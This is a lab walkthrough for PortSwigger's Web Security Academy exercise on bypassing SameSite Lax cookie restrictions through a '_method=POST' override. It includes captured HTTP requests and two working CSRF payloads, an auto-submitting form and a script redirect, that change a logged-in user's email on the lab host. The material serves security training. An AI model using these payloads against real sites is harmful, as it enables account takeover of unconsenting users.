# Lab: SameSite Lax bypass via method override
# https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-using-get-requests/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override#

```bash
# Login to wiener:peter and after that change your email to a@gmail.com.

# After that check change-email POST request and we see that this doesn't contain any unpredictable tokens , so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions.
```

```bash
# let's check POST /login.

POST /login HTTP/2
Host: 0a92003804a9626c8024c11a001a0099.web-security-academy.net
Cookie: session=KuzsK7qUvRgDCyrLerl9U9Bbioc5Bv69
Referer: https://0a92003804a9626c8024c11a001a0099.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a92003804a9626c8024c11a001a0099.web-security-academy.net

username=wiener&password=peter

# Website doesn't explicitly specify any SameSite restrictions when setting session cookies.
# So browser will use default lax restriction level.

# Which means the session cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation. 
```

```bash
# Send change-email POST request to repeater.
# After that right click and change request method and send it.

#Response:

HTTP/2 405 Method Not Allowed
Allow: POST
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

```bash

GET /my-account/change-email?email=adef%40gmail.com&_method=POST HTTP/2

# After changing this part send request.

HTTP/2 200 OK

# _method=POST: This query parameter indicates that the request should be treated as a POST request even though it's using the GET method.
# This technique is often used in frameworks or applications that don't allow direct POST requests or for tunneling purposes.
```

```bash
# Payload:

<http>
<body>
<form method="GET" action="https://0a92003804a9626c8024c11a001a0099.web-security-academy.net/my-account/change-email">
<input type="hidden" name="_method" value="POST">
<input type="hidden" name="email" value="haydari@gmail.com">
<script>
	document.forms[0].submit();
</script>
</body>
</http>

# You can also use this:

<script>
    document.location = "https://0a06007503b52c448040031600db0037.web-security-academy.net/my-account/change-email?email=bora@gmail.com&_method=POST";
</script>
```



